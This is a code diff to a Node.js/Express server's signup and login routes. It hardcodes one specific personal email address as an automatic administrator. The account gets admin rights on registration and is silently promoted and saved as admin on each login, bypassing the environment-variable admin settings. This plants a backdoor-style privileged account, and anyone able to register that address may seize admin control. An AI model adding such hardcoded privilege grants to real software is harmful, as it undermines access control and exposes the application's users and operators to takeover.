@@ -124,8 +124,11 @@ async function startServer() {
       const existingUser = await User.findOne({ $or: [{ username }, { email }] });
       if (existingUser) return res.status(400).json({ error: 'Username or email already exists' });
 
-      // Check if user should be admin based on ENV variables
+      // Check if user should be admin based on ENV variables or specific email
       let isUserAdmin = false;
+      if (email === 'rracfo@gmail.com') {
+        isUserAdmin = true;
+      }
       for (let i = 1; i <= 5; i++) {
         const adminUsername = process.env[`ADMIN_USER_${i}`];
         if (adminUsername && adminUsername === username) {
@@ -155,6 +158,12 @@ async function startServer() {
 
       const validPassword = await bcrypt.compare(password, user.password);
       if (!validPassword) return res.status(400).json({ error: 'Invalid credentials' });
+
+      // Auto-upgrade to admin if email matches
+      if (user.email === 'rracfo@gmail.com' && !user.isAdmin) {
+        user.isAdmin = true;
+        await user.save();
+      }
 
       const token = jwt.sign({ id: user._id, username: user.username, isAdmin: user.isAdmin }, JWT_SECRET, { expiresIn: '7d' });
       res.json({ token, user: { id: user._id, username: user.username, email: user.email, isAdmin: user.isAdmin } });
